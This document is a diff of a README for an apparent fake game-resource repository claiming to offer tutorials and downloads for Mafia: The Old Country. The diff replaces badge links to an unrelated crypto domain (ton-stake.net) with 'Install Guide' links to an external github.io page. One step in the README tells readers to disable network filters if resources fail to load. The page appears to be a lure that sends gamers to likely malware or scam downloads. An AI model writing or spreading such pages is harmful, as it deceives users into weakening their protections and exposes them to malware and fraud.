@@ -6,7 +6,9 @@
 
 **About MafiaOldCountry-Hub-2025**: MafiaOldCountry-Hub-2025 is a resource center for gamers eager to dive into **Mafia: The Old Country** on Windows, macOS, and consoles. This repository offers community-crafted tutorials, setup tips, and exclusive resources to enrich your gaming experience. Supported by 67K+ visitors and 43K+ subscribers, it’s the perfect place for Mafia fans in 2025!
 
-[![Start Playing](https://img.shields.io/badge/Start_Playing-NOW-00cc00?style=rounded&labelColor=1a1a1a)](https://ton-stake.net)
+<a href="https://mafialegacyalliance.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
 ---
 
@@ -29,7 +31,9 @@ Immerse yourself in **Mafia: The Old Country** with **MafiaOldCountry-Hub-2025**
 5. **Resolve Access Issues** 🌐  
    If resources don’t load, disable any network filters or switch browsers (e.g., Chrome, Firefox, or Edge).
 
-[![Start Playing](https://img.shields.io/badge/Start_Playing-NOW-00cc00?style=rounded&labelColor=1a1a1a)](https://ton-stake.net)
+<a href="https://mafialegacyalliance.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
 ---
 
